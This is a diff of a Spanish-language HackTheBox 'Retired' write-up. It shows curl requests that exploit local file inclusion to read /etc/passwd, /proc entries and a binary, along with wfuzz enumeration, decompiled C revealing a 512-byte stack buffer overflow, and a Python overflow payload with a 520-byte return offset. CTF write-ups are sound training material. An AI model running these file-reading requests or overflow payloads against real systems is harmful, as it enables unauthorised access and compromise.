@@ -150,12 +150,12 @@ PORT   STATE SERVICE
 80/tcp open  http</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Solo por comodidad agregamos el dominio <code class="language-plaintext highlighter-rouge">retired.htb</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, al visitar la pagina principal podemos ver que el archivo es gestionado mediante el parametro <code class="language-plaintext highlighter-rouge">page</code> en la petición <code class="language-plaintext highlighter-rouge">GET</code> el cual por defecto apunta a <code class="language-plaintext highlighter-rouge">default.html</code></p>
+<p class="plain-text">Al visitar la pagina principal podemos ver que el archivo es gestionado mediante el parametro <code class="language-plaintext highlighter-rouge">page</code> en la petición <code class="language-plaintext highlighter-rouge">GET</code> el cual por defecto apunta a <code class="language-plaintext highlighter-rouge">default.html</code></p>
 <a href="/hackthebox/retired/1.png" target="_blank"><div><p><img src="/hackthebox/retired/1.png"></p></div></a>
 
 <p class="plain-text">Podemos probar un <code class="language-plaintext highlighter-rouge">Local File Inclusion</code> para apuntar a archivos locales de la máquina, en este caso logramos leer directamente el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/etc/passwd"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">sh$  
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/etc/passwd"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">sh$  
 root:x:0:0:root:/root:/bin/ba</span><span class="ro">sh</span><span class="p">
 vagrant:x:1000:1000::/vagrant:/bin/ba</span><span class="ro">sh</span><span class="p">
 dev:x:1001:1001::/home/dev:/bin/ba</span><span class="ro">sh</span>
@@ -163,7 +163,7 @@ dev:x:1001:1001::/home/dev:/bin/ba</span><span class="ro">sh</span>
 
 <p class="plain-text">Si revisamos el archivo <code class="language-plaintext highlighter-rouge">index.php</code> nos encontramos con que deberia haber una <code class="language-plaintext highlighter-rouge">sanitización</code> para el LFI sin embargo desde <code class="language-plaintext highlighter-rouge">curl</code> aunque tenemos un <code class="language-plaintext highlighter-rouge">302</code> nos detenemos justo antes de la redireccion a <code class="language-plaintext highlighter-rouge">default.html</code> y podemos ver el contenido</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=index.php"</span><span class="p">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=index.php"</span><span class="p">
 &lt?php
 </span><span class="o">function </span><span class="no">sanitize_input</span><span class="p">($</span><span class="am">param</span><span class="p">) {
     $param1 </span><span class="o">= </span><span class="no">str_replace</span><span class="p">(</span><span class="s">"../"</span><span class="p">,</span><span class="s">""</span><span class="p">,$param);
@@ -184,12 +184,12 @@ $page </span><span class="o">= </span><span class="p">$_GET[</span><span class="
 
 <p class="plain-text">Por ahora buscaremos mas archivos con extensión <code class="language-plaintext highlighter-rouge">.html</code>, esto podemos bruteforcear usando <code class="language-plaintext highlighter-rouge">wfuzz</code> y un diccionario de rutas, nos encontramos con <code class="language-plaintext highlighter-rouge">beta</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://retired.htb/FUZZ.html -t 100 --hc 404  
+<code><span class="ve">❯ wfuzz</span><span class="p"> -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.10.11.154/FUZZ.html -t 100 --hc 404  
 ********************************************************
 * Wfuzz 3.1.0 - The Web Fuzzer                         *
 ********************************************************
 
-Target: http://retired.htb/FUZZ.html
+Target: http://10.10.11.154/FUZZ.html
 Total requests: 30000
 
 =====================================================================
@@ -208,7 +208,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p class="plain-text">Si miramos lo que hace el php toma el contenido del archivo <code class="language-plaintext highlighter-rouge">licensefile</code> que recibe en la petición y lo reenvia a el puerto <code class="language-plaintext highlighter-rouge">1337</code> de la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> mediante un socket</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=activate_license.php"</span><span class="p">
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=activate_license.php"</span><span class="p">
 &lt?php
 </span><span class="o">if</span><span class="p">(</span><span class="o">isset</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">])) {
     $license      </span><span class="o">= </span><span class="no">file_get_contents</span><span class="p">($_FILES[</span><span class="s">'licensefile'</span><span class="p">][</span><span class="s">'tmp_name'</span><span class="p">]);
@@ -232,13 +232,13 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p class="plain-text">En el archivo <code class="language-plaintext highlighter-rouge">/proc/sched_debug</code> encontramos información sobre los <code class="language-plaintext highlighter-rouge">procesos</code> corriendo, si grepeamos por <code class="language-plaintext highlighter-rouge">activate</code> encontramos uno correspondiente al pid <code class="language-plaintext highlighter-rouge">400</code></p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/proc/sched_debug"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">activate
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/proc/sched_debug"</span><span class="p"> | </span><span class="ve">grep </span><span class="p">activate
  S </span><span class="ro">activate</span><span class="p">_licens   400     15754.825063        23   120         0.000000         5.085409         0.000000 0 0 /  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Si descargamos el archivo <code class="language-plaintext highlighter-rouge">cmdline</code> del proceso que corresponde al pid <code class="language-plaintext highlighter-rouge">400</code> podemos ver el comando con el que se <code class="language-plaintext highlighter-rouge">ejecuto</code> el archivo que creo el proceso</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://retired.htb/?page=/proc/400/cmdline"</span><span class="p"> -o cmdline  
+<code><span class="ve">❯ curl</span><span class="p"> -s </span><span class="am">"http://10.10.11.154/?page=/proc/400/cmdline"</span><span class="p"> -o cmdline  
 
 </span><span class="ve">❯ cat </span><span class="p">cmdline
 /usr/bin/activate_license1337</span>
@@ -258,7 +258,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 <p class="plain-text">Para ver en que consiste el programa que se ejecuta en el puerto <code class="language-plaintext highlighter-rouge">1337</code> descargamos con curl el archivo <code class="language-plaintext highlighter-rouge">activate_license</code> para poder analizarlo en local mas adelante</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/usr/bin/activate_license"</span><span class="p"> -o activate_license  </span>
+<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://10.10.11.154/?page=/usr/bin/activate_license"</span><span class="p"> -o activate_license  </span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Otorgamos permisos de ejecución a este y al ejecutarlo nos pide un <code class="language-plaintext highlighter-rouge">argumento</code>, como en el cmdline le pasaremos el <code class="language-plaintext highlighter-rouge">1337</code>, al hacerlo empieza un <code class="language-plaintext highlighter-rouge">listener</code> en este</p>
@@ -273,182 +273,25 @@ Error: specify port to bind to
 [+] listening ...</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Para analizar mejor podemos decompilarlo con <code class="language-plaintext highlighter-rouge">ida</code> y ver su pseudocodigo en <code class="language-plaintext highlighter-rouge">C</code></p>
+<p class="plain-text">Para analizar mejor podemos abrirlo en <code class="language-plaintext highlighter-rouge">ida</code>, la función main inicia comprobando que se reciba un argumento que en este caso sera el puerto donde se pondrá en escucha</p>
+<a href="/hackthebox/retired/4.png" target="_blank"><div><p><img src="/hackthebox/retired/4.png"></p></div></a>
+
+<p class="plain-text">Una vez se recibe un puerto se pasa a <code class="language-plaintext highlighter-rouge">htons</code> para darle el formato adecuado, posteriormente se utiliza la función <code class="language-plaintext highlighter-rouge">socket</code> para crear un nuevo socket y luego se llama a <code class="language-plaintext highlighter-rouge">bind</code> simplemente para asociar el socket a la direccion local</p>
+<a href="/hackthebox/retired/5.png" target="_blank"><div><p><img src="/hackthebox/retired/5.png"></p></div></a>
+
+<p class="plain-text">Ahora llama a <code class="language-plaintext highlighter-rouge">listen</code> para que ese socket espere una conexion entrante, después con <code class="language-plaintext highlighter-rouge">puts</code> se muestra un mensaje para mostrar que esta en escucha, luego se llama a <code class="language-plaintext highlighter-rouge">accept</code> que deberia aceptar una conexion entrante cualquiera de un cliente</p>
+<a href="/hackthebox/retired/6.png" target="_blank"><div><p><img src="/hackthebox/retired/6.png"></p></div></a>
+
+<p class="plain-text">Luego de aceptar la conexión se guarda el nuevo descriptor que pertenece al cliente y le pasa ese socket recibido como argumento a la función <code class="language-plaintext highlighter-rouge">activate_license</code></p>
 <a href="/hackthebox/retired/7.png" target="_blank"><div><p><img src="/hackthebox/retired/7.png"></p></div></a>
 
-<p class="plain-text">El codigo comprueba que tenga un <code class="language-plaintext highlighter-rouge">argumento</code> e inicia un simple <code class="language-plaintext highlighter-rouge">listener</code> con el</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">int</span><span class="p"> __fastcall __noreturn </span><span class="na">main</span><span class="p">(</span><span class="no">int </span><span class="am">argc</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">argv</span><span class="p">, </span><span class="o">const </span><span class="no">char </span><span class="o">**</span><span class="am">envp</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="o">*</span><span class="p">no_ptr_port; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_port; </span><span class="c1">// rax
-  </span><span class="no">int </span><span class="o">*</span><span class="p">no_ptr_listen; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_listen; </span><span class="c1">// rax
-  </span><span class="no">int </span><span class="o">*</span><span class="p">no_ptr_bind; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_bind; </span><span class="c1">// rax
-  </span><span class="no">int </span><span class="o">*</span><span class="p">no_ptr_socket; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_socket; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="p">clientaddr_s[</span><span class="mi">16</span><span class="p">]; </span><span class="c1">// [rsp+10h] [rbp-50h] BYREF
-  </span><span class="p">sockaddr_in clientaddr; </span><span class="c1">// [rsp+20h] [rbp-40h] BYREF
-  </span><span class="p">socklen_t clientaddrlen; </span><span class="c1">// [rsp+3Ch] [rbp-24h] BYREF
-  </span><span class="p">sockaddr_in server; </span><span class="c1">// [rsp+40h] [rbp-20h] BYREF
-  </span><span class="na">uint16_t </span><span class="p">port; </span><span class="c1">// [rsp+56h] [rbp-Ah] BYREF
-  </span><span class="no">int </span><span class="p">clientfd; </span><span class="c1">// [rsp+58h] [rbp-8h]
-  </span><span class="no">int </span><span class="p">serverfd; </span><span class="c1">// [rsp+5Ch] [rbp-4h]
+<p class="plain-text">El primer bloque de la función <code class="language-plaintext highlighter-rouge">activate_license</code> utiliza la función <code class="language-plaintext highlighter-rouge">read</code> para leer el tamaño del buffer que se recibió, que es el archivo que se envia desde la web</p>
+<a href="/hackthebox/retired/9.png" target="_blank"><div><p><img src="/hackthebox/retired/9.png"></p></div></a>
 
-  </span><span class="o">if</span><span class="p"> ( argc </span><span class="o">!= </span><span class="mi">2</span><span class="p"> )
-    error(</span><span class="s">"specify port to bind to"</span><span class="p">);
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)__isoc99_sscanf(argv[</span><span class="mi">1</span><span class="p">], </span><span class="s">"</span><span class="mi">%hu</span><span class="s">"</span><span class="p">, </span><span class="o">&</span><span class="p">port) </span><span class="o">== -</span><span class="mi">1 </span><span class="p">)
-  {
-    no_ptr_port </span><span class="o">= </span><span class="p">__errno_location();
-    error_port </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">no_ptr_port);
-    error(error_port);
-  }
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] starting server listening on port </span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, port);
-  server.sin_family </span><span class="o">= </span><span class="mi">2</span><span class="p">;
-  server.sin_addr.s_addr </span><span class="o">= </span><span class="p">htonl(</span><span class="mi">0x7F000001</span><span class="no">u</span><span class="p">);
-  server.sin_port </span><span class="o">= </span><span class="p">htons(port);
-  serverfd </span><span class="o">= </span><span class="p">socket(</span><span class="mi">2</span><span class="p">, </span><span class="mi">1</span><span class="p">, </span><span class="mi">6</span><span class="p">);
-  </span><span class="o">if</span><span class="p"> ( serverfd </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    no_ptr_listen </span><span class="o">=</span><span class="p"> __errno_location();
-    error_listen </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">no_ptr_listen);
-    error(error_listen);
-  }
-  </span><span class="o">if</span><span class="p"> ( bind(serverfd, (</span><span class="o">const </span><span class="no">struct </span><span class="p">sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">server, </span><span class="mi">0x10</span><span class="no">u</span><span class="p">) </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    no_ptr_bind </span><span class="o">=</span><span class="p"> __errno_location();
-    error_bind </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">no_ptr_bind);
-    error(error_bind);
-  }
-  </span><span class="o">if</span><span class="p"> ( listen(serverfd, </span><span class="mi">100</span><span class="p">) </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    no_ptr_socket </span><span class="o">= </span><span class="p">__errno_location();
-    error_socket </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">no_ptr_socket);
-    error(error_socket);
-  }
-  </span><span class="no">puts</span><span class="p">(</span><span class="s">"[+] listening ..."</span><span class="p">);
-  </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
-  {
-    </span><span class="o">while</span><span class="p"> ( </span><span class="mi">true</span><span class="p"> )
-    {
-      clientfd </span><span class="o">= </span><span class="p">accept(serverfd, (</span><span class="no">struct </span><span class="p">sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">clientaddr, </span><span class="o">&</span><span class="p">clientaddrlen);
-      </span><span class="o">if</span><span class="p"> ( clientfd </span><span class="o">!= -</span><span class="mi">1</span><span class="p"> )
-        </span><span class="o">break</span><span class="p">;
-      </span><span class="no">fwrite</span><span class="p">(</span><span class="s">"Error: accepting client</span><span class="mi">\n</span><span class="s">"</span><span class="p">, </span><span class="mi">1</span><span class="no">uLL</span><span class="p">, </span><span class="mi">0x18</span><span class="no">uLL</span><span class="p">, stderr);
-    }
-    inet_ntop(</span><span class="mi">2</span><span class="p">, </span><span class="o">&</span><span class="p">clientaddr.sin_addr, clientaddr_s, </span><span class="mi">0x10</span><span class="no">u</span><span class="p">);
-    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] accepted client connection from </span><span class="mi">%s</span><span class="s">:</span><span class="mi">%d\n</span><span class="s">"</span><span class="p">, clientaddr_s, clientaddr.sin_port);  
-    </span><span class="o">if</span><span class="p"> ( </span><span class="o">!</span><span class="p">fork() )
-    {
-      close(serverfd);
-      activate_license(clientfd);
-      </span><span class="no">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);
-    }
-    __sysv_signal(</span><span class="mi">17</span><span class="p">, (__sighandler_t)((</span><span class="no">char </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">dword_0 </span><span class="o">+ </span><span class="mi">1</span><span class="p">));
-    close(clientfd);
-  }
-}</span>
-</code></pre></div></div><br>
+<p class="plain-text">Luego de ello se lee el buffer o contenido del archivo, sin embargo este se guarda en un buffer en <code class="language-plaintext highlighter-rouge">rbp - 512</code> por lo que si el tamaño del archivo excede ese limite sobrescribira otros datos ocasionando una vulnerabilidad de <code class="language-plaintext highlighter-rouge">buffer overflow</code></p>
+<a href="/hackthebox/retired/10.png" target="_blank"><div><p><img src="/hackthebox/retired/10.png"></p></div></a>
 
-<p class="plain-text">Define como <code class="language-plaintext highlighter-rouge">clientfd</code> aquello que recibe del socket en este caso del puerto <code class="language-plaintext highlighter-rouge">1337</code>, despues llama a la función <code class="language-plaintext highlighter-rouge">activate_license</code> pasandole clientfd como <code class="language-plaintext highlighter-rouge">argumento</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="p">clientfd </span><span class="o">= </span><span class="p">accept(serverfd, (</span><span class="no">struct </span><span class="p">sockaddr </span><span class="o">*</span><span class="p">)</span><span class="o">&</span><span class="p">clientaddr, </span><span class="o">&</span><span class="p">clientaddrlen);  
-activate_license(clientfd);</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">activate_license</code> recibe como argumento <code class="language-plaintext highlighter-rouge">sockfd</code>, despues realiza algunas operaciones con la <code class="language-plaintext highlighter-rouge">licencia</code> que recibe, mediante <code class="language-plaintext highlighter-rouge">sqlite3</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">void </span><span class="p">__fastcall </span><span class="na">activate_license</span><span class="p">(</span><span class="no">int </span><span class="am">sockfd</span><span class="p">)
-{
-  </span><span class="no">int </span><span class="o">*</span><span class="p">read_msglen; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_msglen; </span><span class="c1">// rax
-  </span><span class="no">int </span><span class="o">*</span><span class="p">read_buffer; </span><span class="c1">// rax
-  </span><span class="no">char </span><span class="o">*</span><span class="p">error_buffer; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_sqlite; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_table; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_prepare; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_bind; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_step; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_reset; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_finalize; </span><span class="c1">// rax
-  </span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">error_close; </span><span class="c1">// rax
-  </span><span class="p">sqlite3_stmt </span><span class="o">*</span><span class="p">stmt; </span><span class="c1">// [rsp+18h] [rbp-218h] BYREF
-  </span><span class="p">sqlite3 </span><span class="o">*</span><span class="p">db; </span><span class="c1">// [rsp+20h] [rbp-210h] BYREF
-  </span><span class="na">uint32_t </span><span class="p">msglen; </span><span class="c1">// [rsp+2Ch] [rbp-204h] BYREF
-  </span><span class="no">char </span><span class="p">buffer[</span><span class="mi">512</span><span class="p">];</span><span class="c1"> // [rsp+30h] [rbp-200h] BYREF
-
-  </span><span class="o">if</span><span class="p"> ( read(sockfd, </span><span class="o">&</span><span class="p">msglen, </span><span class="mi">4</span><span class="no">uLL</span><span class="p">) </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    read_msglen </span><span class="o">= </span><span class="p">__errno_location();
-    error_msglen </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">read_msglen);
-    error(error_msglen);
-  }
-  msglen </span><span class="o">= </span><span class="p">ntohl(msglen);
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] reading </span><span class="mi">%d </span><span class="s">bytes</span><span class="mi">\n</span><span class="s">"</span><span class="p">, msglen);
-  </span><span class="o">if</span><span class="p"> ( read(sockfd, buffer, msglen) </span><span class="o">== -</span><span class="mi">1</span><span class="p"> )
-  {
-    read_buffer </span><span class="o">= </span><span class="p">__errno_location();
-    error_buffer </span><span class="o">= </span><span class="no">strerror</span><span class="p">(</span><span class="o">*</span><span class="p">read_buffer);
-    error(error_buffer);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_open(</span><span class="s">"license.sqlite"</span><span class="p">, </span><span class="o">&</span><span class="p">db) )
-  {
-    error_sqlite </span><span class="o">= </span><span class="p">(</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_sqlite);
-  }
-  sqlite3_busy_timeout(db, </span><span class="mi">2000</span><span class="no">LL</span><span class="p">);
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_exec(
-                       db,
-                       </span><span class="s">"CREATE TABLE IF NOT EXISTS license (   id INTEGER PRIMARY KEY AUTOINCREMENT,   license_key TEXT)"</span><span class="p">,  
-                       </span><span class="mi">0</span><span class="no">LL</span><span class="p">,
-                       </span><span class="mi">0</span><span class="no">LL</span><span class="p">,
-                       </span><span class="mi">0</span><span class="no">LL</span><span class="p">) )
-  {
-    error_table </span><span class="o">= </span><span class="p">(</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_table);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_prepare_v2(db, </span><span class="s">"INSERT INTO license (license_key) VALUES (?)"</span><span class="p">, </span><span class="mi">0xFFFFFFFF</span><span class="no">LL</span><span class="p">, </span><span class="o">&</span><span class="p">stmt, </span><span class="mi">0</span><span class="no">LL</span><span class="p">) )
-  {
-    error_prepare </span><span class="o">=</span><span class="p"> (</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_prepare);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_bind_text(stmt, </span><span class="mi">1</span><span class="no">LL</span><span class="p">, buffer, </span><span class="mi">512</span><span class="no">LL</span><span class="p">, </span><span class="mi">0</span><span class="no">LL</span><span class="p">) )
-  {
-    error_bind </span><span class="o">=</span><span class="p"> (</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_bind);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_step(stmt) </span><span class="o">!= </span><span class="mi">101</span><span class="p"> )
-  {
-    error_step </span><span class="o">= </span><span class="p">(</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_step);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_reset(stmt) )
-  {
-    error_reset </span><span class="o">=</span><span class="p"> (</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_reset);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_finalize(stmt) )
-  {
-    error_finalize </span><span class="o">=</span><span class="p"> (</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_finalize);
-  }
-  </span><span class="o">if</span><span class="p"> ( (</span><span class="no">unsigned int</span><span class="p">)sqlite3_close(db) )
-  {
-    error_close </span><span class="o">=</span><span class="p"> (</span><span class="o">const </span><span class="no">char </span><span class="o">*</span><span class="p">)sqlite3_errmsg(db);
-    error(error_close);
-  }
-  </span><span class="no">printf</span><span class="p">(</span><span class="s">"[+] activated license: </span><span class="mi">%s\n</span><span class="s">"</span><span class="p">, buffer);
-}</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">La vulnerabilidad viene del definir un <code class="language-plaintext highlighter-rouge">buffer</code> de solo <code class="language-plaintext highlighter-rouge">512</code> bytes para <code class="language-plaintext highlighter-rouge">sockfd</code> que es la <code class="language-plaintext highlighter-rouge">licencia</code> que recibe del socket ya que puede convertirse en un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code></p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="no">char </span><span class="p">buffer [</span><span class="mi">512</span><span class="p">];
-</span><span class="no">read</span><span class="p">(sockfd, </span><span class="p">buffer, msglen)  </span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Antes de explotarlo es necesario revisas las <code class="language-plaintext highlighter-rouge">protecciones</code> del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, casi todas estan habilitadas, entre ellas <code class="language-plaintext highlighter-rouge">NX</code> que impide la ejecución en la pila</p>
+<p class="plain-text">Antes de explotarlo es necesario revisas las <code class="language-plaintext highlighter-rouge">protecciones</code> del binario con <code class="language-plaintext highlighter-rouge">checksec</code>, casi todas estan habilitadas, entre ellas <code class="language-plaintext highlighter-rouge">NX</code> que impide la ejecución en la pila y <code class="language-plaintext highlighter-rouge">PIE</code> que hace aleatoria la dirección base del binario por lo que el <code class="language-plaintext highlighter-rouge">rop</code> se complica</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ checksec </span><span class="p">activate_license
 [</span><span class="az">*</span><span class="p">] '/home/kali/activate_license'  
@@ -457,12 +300,6 @@ activate_license(clientfd);</span>
     Stack:    </span><span class="ro">No canary found</span><span class="p">
     NX:       </span><span class="ve">NX enabled</span><span class="p">
     PIE:      </span><span class="ve">PIE enabled</span>
-</code></pre></div></div><br>
-
-<p class="plain-text">Ademas de ello el archivo <code class="language-plaintext highlighter-rouge">randomize_va_space</code> esta seteado a <code class="language-plaintext highlighter-rouge">2</code> lo que significa que el <code class="language-plaintext highlighter-rouge">ASLR</code> habilitado por lo que hay aleatorización en las direcciones de la memoria</p>
-<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
-<code><span class="ve">❯ curl </span><span class="p">-s </span><span class="am">"http://retired.htb/?page=/proc/sys/kernel/randomize_va_space"</span><span class="p">  
-2</span>
 </code></pre></div></div><br>
 
 <p class="plain-text">Iniciemos usando <code class="language-plaintext highlighter-rouge">php</code> en el directorio donde esta <code class="language-plaintext highlighter-rouge">activate_license.php</code> para asi poder redirigir el <code class="language-plaintext highlighter-rouge">licensefile</code> a la <code class="language-plaintext highlighter-rouge">127.0.0.1</code> por el puerto <code class="language-plaintext highlighter-rouge">1337</code></p>
@@ -482,18 +319,18 @@ Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/l
 [+] listening ...</span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Ahora podemos usar <code class="language-plaintext highlighter-rouge">python</code> para definir como archivo <code class="language-plaintext highlighter-rouge">licensefile</code> un patron de 550 bytes generado con <code class="language-plaintext highlighter-rouge">cyclic</code>, lo enviamos al archivo <code class="language-plaintext highlighter-rouge">activate_license.php</code></p>
+<p class="plain-text">Podemos usar <code class="language-plaintext highlighter-rouge">python</code> para enviar nuestro payload como archivo <code class="language-plaintext highlighter-rouge">licensefile</code> al <code class="language-plaintext highlighter-rouge">activate_license.php</code>, nuestro payload consiste en <code class="language-plaintext highlighter-rouge">512 A's</code> que llenaran el buffer, <code class="language-plaintext highlighter-rouge">8 B's</code> que tomaran el valor de <code class="language-plaintext highlighter-rouge">rbp</code> y <code class="language-plaintext highlighter-rouge">8 C's</code> que sobrescribirán la dirección de retorno</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3</span><span class="p"> -q
 >>> from pwn import cyclic
 >>> import requests
->>> payload = cyclic(550, n=8)
+>>> payload = b"A" * 512 + b"B" * 8 + b"C" * 8
 >>> requests.post("http://localhost/activate_license.php", files={"licensefile": payload})  
 &ltResponse [200]>
 >>></span>
 </code></pre></div></div><br>
 
-<p class="plain-text">Al hacer esto solo un <code class="language-plaintext highlighter-rouge">hilo</code> del programa que esta corriendo en gdb se corrompe</p>
+<p class="plain-text">Al hacer esto solo un <code class="language-plaintext highlighter-rouge">hilo</code> del programa que esta corriendo en gdb se corrompe, solo nos queda comprobar el payload, <code class="language-plaintext highlighter-rouge">rbp</code> tomo el valor de las <code class="language-plaintext highlighter-rouge">B's</code> y la direccion de retorno las <code class="language-plaintext highlighter-rouge">C's</code>, comprobamos que el offset es de <code class="language-plaintext highlighter-rouge">520</code> bytes para el retorno</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ro">pwndbg> </span><span class="p">run
 Starting program: </span><span class="ve">/home/kali/activate_license </span><span class="p">1337
@@ -502,22 +339,15 @@ Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/l
 [+] listening ...
 [+] accepted client connection from 0.0.0.0:0
 Using host libthread_db library "</span><span class="ve">/lib/x86_64-linux-gnu/libthread_db.so.1</span><span class="p">".
-[+] reading 550 bytes
